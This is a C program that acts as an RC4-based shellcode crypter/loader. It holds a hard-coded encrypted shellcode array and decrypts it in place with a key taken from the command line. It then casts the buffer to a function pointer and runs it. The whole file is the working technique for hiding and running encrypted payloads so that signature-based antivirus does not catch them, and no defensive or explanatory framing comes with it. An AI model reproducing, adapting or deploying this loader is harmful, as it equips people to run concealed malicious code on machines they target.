#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#define ARRAY_LENGTH	256
unsigned char s[ARRAY_LENGTH];
int rc4_i;
int rc4_j;

unsigned char encrypted_shellcode[] = \
"\x78\x3e\xb1\x69\x75\x93\xbe\x9e\x33\x2a\x08\xc0\x7f\xd3\xb1\xf5\xdd\x16\xc3\x4f\x12\x42\xe7\x93\x4b";

swap(unsigned char *s1, unsigned char *s2)
{

	char temp = *s1;

	*s1 = *s2;
	*s2 = temp;
}

int InitRC4(void)
{
	int i;

	for(i=0 ; i < ARRAY_LENGTH; i++)
		s[i] = i;

	rc4_i = rc4_j = 0;

	return 1;
}

int DoKSA(unsigned char *key, int key_len)
{

	for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
	{
		rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
		swap(&s[rc4_i], &s[rc4_j]);
	}

	// reset counter for PRGA

	rc4_i = rc4_j =0;
}


char GetPRGAOutput(void)
{

	rc4_i = (rc4_i +1) % ARRAY_LENGTH;

	rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;

	swap(&s[rc4_i], &s[rc4_j]);

	return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];

}



main(int argc, char **argv)
{

	unsigned char *encryption_key;
	int encryption_key_length;
	unsigned char data_byte;
	int encrypted_shellcode_len;
	int counter;
	int (*ret)() = (int(*)())encrypted_shellcode;


	encryption_key = (unsigned char *)argv[1];
	encryption_key_length = strlen((char *)encryption_key);

	if(encryption_key_length > ARRAY_LENGTH)
	{
		printf("Key too large, should be <= 256 characters\n");
		exit(-1);
	}

	InitRC4();
	DoKSA(encryption_key, encryption_key_length);

	encrypted_shellcode_len = strlen(encrypted_shellcode);
	printf("Decrypting RC4 Encrypted Shellcode\n\n\n\"");

	for (counter=0; counter < encrypted_shellcode_len; counter++)
	{
		encrypted_shellcode[counter] ^= GetPRGAOutput();

	}

	ret();

	printf("\"\n\n");
	return 1;
}
